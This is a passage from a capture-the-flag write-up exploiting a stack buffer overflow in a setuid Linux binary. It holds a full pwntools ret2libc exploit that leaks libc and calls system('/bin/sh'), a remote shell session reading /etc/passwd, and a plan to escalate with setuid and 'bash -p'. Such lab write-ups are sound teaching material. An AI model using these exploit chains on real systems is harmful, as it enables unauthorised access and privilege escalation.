Exploitation<br></blockquote>

<p>Using radare2 to disassembly the binary:<br><a data-fancybox="gallery" href="https://i.imgur.com/AFxRIiY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AFxRIiY.png" alt=""><br></a><br>We have <strong>fgets</strong> with a very large size <strong>0x400</strong>, it reads from the <strong>STDIN</strong> so we can control what to put in the buffer it’s obvious to see that we have a buffer overflow if we check what kind of protections with checksec:<br><a data-fancybox="gallery" href="https://i.imgur.com/i1sx2G2.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/i1sx2G2.png" alt=""><br></a><br>No <strong>stack canary</strong> protection, but <strong>NX</strong> is enabled (Non-Executable Stack) once again we have to use <strong>Return Oriented Programming</strong> (ROP), the challenge provided the <strong>libc.so</strong> so we can use to calculate the offsets.</p>
<p>The steps to solve are:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Overflow the Buffer</div><div class="line">2 - ROP chain to leak libc addresses and return to main</div><div class="line">3 - Overflow the Buffer again and build a ROP chain to call system(&apos;/bin/sh&apos;)</div></pre></td></tr></table></figure>
<h3 id="Overflow-the-Buffer"><a href="#Overflow-the-Buffer" class="headerlink" title="Overflow the Buffer"></a>Overflow the Buffer</h3><p>Well this always the same first we can create a pattern with <strong>metasploit</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">$ gdb ./wrong</div><div class="line"></div><div class="line">pwndbg&gt; b *0x400781</div><div class="line">Breakpoint 1 at 0x400781</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/user/ctf/wrong </div><div class="line">Hello! What is your name?</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">Nice to meet you Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line"></div><div class="line">Breakpoint *0x400781</div><div class="line">pwndbg&gt; x <span class="variable">$rsp</span></div><div class="line">0x7fffffffdea8:	0x62413362</div></pre></td></tr></table></figure>
<p>Now that we got the part of the string pattern that we got from the <strong>RSP</strong> register we can calculate its offset once again using <strong>metasploit</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413362</div><div class="line">[*] Exact match at offset 40</div></pre></td></tr></table></figure>
<p>Finally the padding we require is 40…</p>
<h3 id="ROP-chain-to-leak-libc-addresses-and-return-to-main"><a href="#ROP-chain-to-leak-libc-addresses-and-return-to-main" class="headerlink" title="ROP chain to leak libc addresses and return to main"></a>ROP chain to leak libc addresses and return to main</h3><p>We need to leak a libc address we can do this with <strong>puts</strong> or <strong>printf</strong> they are both present in the binary, because of this they will be also be in the <strong>GOT</strong> (Global Offset Table) as we can check their location addresses using <strong>objdump -R ./wrong</strong>: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ objdump -R ./wrong</div><div class="line"></div><div class="line">./wrong:     file format elf64-x86-64</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET           TYPE              VALUE </div><div class="line">0000000000600b58 R_X86_64_GLOB_DAT  __gmon_start__</div><div class="line">0000000000600bd0 R_X86_64_COPY     stdout@@GLIBC_2.2.5</div><div class="line">0000000000600bd8 R_X86_64_COPY     stdin@@GLIBC_2.2.5</div><div class="line">0000000000600b78 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</div><div class="line">0000000000600b80 R_X86_64_JUMP_SLOT  getuid@GLIBC_2.2.5</div><div class="line">0000000000600b88 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</div><div class="line">0000000000600b90 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</div><div class="line">0000000000600b98 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5</div><div class="line">0000000000600ba0 R_X86_64_JUMP_SLOT  __gmon_start__</div><div class="line">0000000000600ba8 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5</div><div class="line">0000000000600bb0 R_X86_64_JUMP_SLOT  setuid@GLIBC_2.2.5</div></pre></td></tr></table></figure>
<p>We want to get the address that’s stored in the <strong>GOT</strong> of <strong>puts</strong> with it we can calculate the offsets to another useful libc functions like <strong>system</strong> and the offset to the string <strong>/bin/sh</strong>, to call a function within <strong>ROP</strong> we need the <strong>PLT</strong> address we can get them using <strong>objdump -dj.plt ./wrong</strong>: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ objdump -dj.plt ./wrong</div><div class="line"></div><div class="line">./wrong:     file format elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .plt:</div><div class="line"></div><div class="line">0000000000400560 &lt;.plt&gt;</div><div class="line">0000000000400570 &lt;puts@plt&gt;</div><div class="line">0000000000400580 &lt;getuid@plt&gt;</div><div class="line">0000000000400590 &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">00000000004005a0 &lt;__libc_start_main@plt&gt;</div><div class="line">00000000004005b0 &lt;fgets@plt&gt;</div><div class="line">00000000004005c0 &lt;__gmon_start__@plt&gt;</div><div class="line">00000000004005d0 &lt;fflush@plt&gt;</div><div class="line">00000000004005e0 &lt;setuid@plt&gt;</div></pre></td></tr></table></figure>
<p>Since this is a <strong>64bit</strong> binary we need to store the function arguments in registers instead of putting them in the stack, we can do this using <strong>ROPGadgets</strong>, in x64 the first six parameters are saved in <strong>RDI, RSI, RDX, RCX, R8 and R9</strong>, if there are more parameters will be saved on the <strong>stack</strong>. Since <strong>puts</strong> only has 1 argument we just need a <strong>Gadget</strong> that <strong>pop</strong> an address from the <strong>stack</strong> into the <strong>RDI</strong> register, <strong>ROPGadget</strong> can help us finding such a gadget:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary ./wrong --only &quot;pop|ret&quot;</div><div class="line">Gadgets information</div><div class="line">============================================================</div><div class="line">0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007f0 : pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007f2 : pop r15 ; ret</div><div class="line">0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400650 : pop rbp ; ret</div><div class="line">0x00000000004007f3 : pop rdi ; ret</div><div class="line">0x00000000004007f1 : pop rsi ; pop r15 ; ret</div><div class="line">0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400559 : ret</div></pre></td></tr></table></figure>
<p>The <strong>0x00000000004007f3 : pop rdi ; ret</strong> gadget is the one we need, now we just need the address from main so after we run our gadget we can return back to main:<br><a data-fancybox="gallery" href="https://i.imgur.com/8OMMSxC.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/8OMMSxC.png" alt=""><br></a><br>Now that we have everything we need we can start building our ropchain:<br><a data-fancybox="gallery" href="https://i.imgur.com/Oc3R7sF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Oc3R7sF.png" alt=""><br></a></p>
<h3 id="Overflow-the-Buffer-again-and-build-a-ROP-chain-to-call-system-‘-bin-sh’"><a href="#Overflow-the-Buffer-again-and-build-a-ROP-chain-to-call-system-‘-bin-sh’" class="headerlink" title="Overflow the Buffer again and build a ROP chain to call system(‘/bin/sh’)"></a>Overflow the Buffer again and build a ROP chain to call system(‘/bin/sh’)</h3><p>Now we have everything we need to calculate other <strong>libc</strong> addresses we need help from <strong>libc.so.6</strong> file they gave us <strong>pwntools</strong> can help us to get the offsets in a easier way:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc.so.6 | grep '/bin/sh'</span></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./wrong'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PADDING = <span class="string">'A'</span>*<span class="number">40</span></div><div class="line">POPRET = <span class="number">0x4007f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>] <span class="comment">#0x000000000040056c</span></div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x4006e6</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"><span class="comment">#time.sleep(1)</span></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"><span class="keyword">print</span> r.recv(len(<span class="string">'Nice to meet you '</span>)+len(PADDING)+<span class="number">3</span>)</div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">PUTS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"></div><div class="line">LIBCBASE = PUTS -libc.symbols[<span class="string">'puts'</span>]</div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">log.info(<span class="string">"LEAKED PUTS LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
<p>Now that we have the addresses we need we can start again to build a new <strong>ropchain</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/2cuyHS8.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/2cuyHS8.png" alt=""><br></a><br>Now the full exploit could be written as follows:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./wrong'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'10.133.70.1'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line">local = <span class="keyword">True</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x0040076c</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line"><span class="comment"># </span></div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc.so.6 | grep '/bin/sh'</span></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./wrong'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PADDING = <span class="string">'A'</span>*<span class="number">40</span></div><div class="line">POPRET = <span class="number">0x4007f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>] <span class="comment">#0x000000000040056c</span></div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x4006e6</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"><span class="comment">#time.sleep(1)</span></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"><span class="keyword">print</span> r.recv(len(<span class="string">'Nice to meet you '</span>)+len(PADDING)+<span class="number">3</span>)</div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">PUTS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"></div><div class="line">LIBCBASE = PUTS -libc.symbols[<span class="string">'puts'</span>]</div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">log.info(<span class="string">"LEAKED PUTS LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(BINSH) <span class="comment"># BINSH ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(SYSTEM) <span class="comment"># SYSTEM function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"></div><div class="line"></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>If you run it you will get a shell to the server:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">python wrong_part1.py </div><div class="line">[+] Opening connection to 10.133.70.1 on port 6666: Done</div><div class="line">/usr/<span class="built_in">local</span>/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module hashlib was already imported from /usr/lib/python2.7/hashlib.pyc, but /usr/<span class="built_in">local</span>/lib/python2.7/dist-packages is being added to sys.path</div><div class="line">  import pkg_resources</div><div class="line">/usr/<span class="built_in">local</span>/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module six was already imported from /home/evilgod/.<span class="built_in">local</span>/lib/python2.7/site-packages/six.pyc, but /usr/lib/python2.7/dist-packages is being added to sys.path</div><div class="line">  import pkg_resources</div><div class="line">[*] <span class="string">'/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/wrong'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">Hello! What is your name?</div><div class="line"></div><div class="line">Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@</div><div class="line"></div><div class="line">Hello! What is your name?</div><div class="line"></div><div class="line">[*] LEAKED PUTS LIBC 0x7fd320e62690</div><div class="line">[*] SYSTEM LIBC 0x7fd320e38390</div><div class="line">[*] LIBCBASE LIBC 0x7fd320df3000</div><div class="line">[*] BINSH ADDRESS 0x7fd320f7fd17</div><div class="line">[*] Switching to interactive mode</div><div class="line">Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@<span class="variable">$id</span></div><div class="line">uid=1001(wrong-user) gid=1001(wrong-user) groups=1001(wrong-user)</div><div class="line"></div><div class="line">$ <span class="built_in">cd</span> home</div><div class="line">$ ls</div><div class="line"><span class="keyword">case</span></div><div class="line">molly</div><div class="line">ubuntu</div><div class="line">wrong-user</div><div class="line">$ <span class="built_in">cd</span> molly</div><div class="line">$ ls</div><div class="line">flag.txt</div><div class="line">wrong</div><div class="line">$ cat flag.txt</div><div class="line">cat: flag.txt: Permission denied</div><div class="line">$ ls -lta</div><div class="line">total 13</div><div class="line">drwxr-xr-x 6 root  root          6 Oct 21 10:25 ..</div><div class="line">drwxr-xr-x 2 root  molly         7 Aug 31 22:37 .</div><div class="line">-rw-r----- 1 molly molly        29 Aug 31 22:37 flag.txt</div><div class="line">-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong</div><div class="line">-rw-r--r-- 1 root  molly       220 Aug 31 22:24 .bash_logout</div><div class="line">-rw-r--r-- 1 root  molly      3771 Aug 31 22:24 .bashrc</div><div class="line">-rw-r--r-- 1 root  molly       655 Aug 31 22:24 .profile</div></pre></td></tr></table></figure></p>
<p>So what’s wrong here? We don’t have access to the flag.txt, and happens we got access to the wrong user, there are some problems here, one of them is that in the beginning of the program we can see it’s being run <strong>setuid(getuid())</strong> :<br><a data-fancybox="gallery" href="https://i.imgur.com/pu2OY09.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pu2OY09.png" alt=""><br></a></p>
<p>This will drop permissions from the as we can see when we did <strong>ls -lta</strong> the executable has the <strong>setuid</strong> enabled:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong</div></pre></td></tr></table></figure></p>
<p>Translating this a little bit:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">OWNER:                                                         Group</div><div class="line">-rws                                                           r-x                               </div><div class="line">||||---&gt; Execute and setuid bit (both enabled).                |||</div><div class="line">|||---&gt; Write Permissions(enabled)                             || \--&gt; Executable permissions (Enabled)</div><div class="line">| \---&gt; Read permissions(enabled)                              | \--&gt; Write Permissions (Disabled)</div><div class="line"> \---&gt; If it&apos;s a directory(disabled)                            \---&gt; Read Permissions (Enabled)</div><div class="line"></div><div class="line">World:</div><div class="line">---</div><div class="line">|||</div><div class="line">|| \---&gt; Executable permissions (Disabled)</div><div class="line">| \---&gt; Write Permissions (Disabled)</div><div class="line"> \---&gt; Read Permissions (Disabled)</div></pre></td></tr></table></figure></p>
<p>When the <strong>setuid</strong> is enabled the process will run with <strong>owner</strong> permissions, but there are some issues that are dropping privileges, the <strong>setuid(getuid())</strong> is one of them this is simple to solve we just need to create a ropchain that calls <strong>setuid(molly_uid)</strong> first we need to find <strong>molly’s uid</strong> this is easy we can check <strong>/etc/passwd</strong> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/passwd</div><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></div><div class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></div><div class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">syslog:x:104:108::/home/syslog:/bin/<span class="literal">false</span></div><div class="line">_apt:x:105:65534::/nonexistent:/bin/<span class="literal">false</span></div><div class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></div><div class="line">messagebus:x:107:111::/var/run/dbus:/bin/<span class="literal">false</span></div><div class="line">uuidd:x:108:112::/run/uuidd:/bin/<span class="literal">false</span></div><div class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/<span class="literal">false</span></div><div class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">pollinate:x:111:1::/var/cache/pollinate:/bin/<span class="literal">false</span></div><div class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</div><div class="line">wrong-user:x:1001:1001:,,,:/home/wrong-user:/bin/bash</div><div class="line">molly:x:1337:1337:,,,:/home/molly:/bin/bash</div><div class="line"><span class="keyword">case</span>:x:1002:1002:,,,:/home/<span class="keyword">case</span>:/bin/bash</div></pre></td></tr></table></figure>
<p>Molly’s uid is <strong>1337</strong> writing a ropchain is trivial, we can do it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SETUID = LIBCBASE + libc.symbols[<span class="string">'setuid'</span>]</div><div class="line"></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI RET</span></div><div class="line">ropchain += p64(<span class="number">1337</span>) <span class="comment"># 1337 ARG[1]</span></div><div class="line">ropchain += p64(SETUID) <span class="comment"># SETUID function "call"</span></div></pre></td></tr></table></figure>
<p>Now we ran into another problem, <strong>system</strong> will drop privileges we need to use an alternative <strong>exec</strong> is perfect for this, but we can’t just do <strong>execv(‘/bin/bash’,0x0)</strong> if we read the man documentation of <strong>/bin/bash</strong> :<br><a data-fancybox="gallery" href="https://i.imgur.com/yn29jpS.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/yn29jpS.png" alt=""><br></a></p>
<p>The explanation from man pages is very clear, we need to provide <strong>-p</strong> as an argument to <strong>/bin/bash</strong>, we could do it with a <strong>ROPCHAIN</strong> but is harder to to find the right <strong>gadgets</strong> to put more than 1 arguments, since we have local access to the server we can just write a file into <strong>/tmp/exp</strong> and then execute it with <strong>execv(“/tmp/exp”,0x0)</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/bin/bash -p</span></div><div class="line">/bin/bash -p</div></pre></td></tr></table></figure>
<p>I had some problems to use <strong>vim</strong> and <strong>nano</strong> (python interactive shell didn’t work very well with them), so I had to write to script in my machine and convert it into <strong>base64</strong>, then using <strong>echo</strong> I wrote the file and decoded it into <strong>/tmp/exp</strong>:</p>
<p>My machine</p>
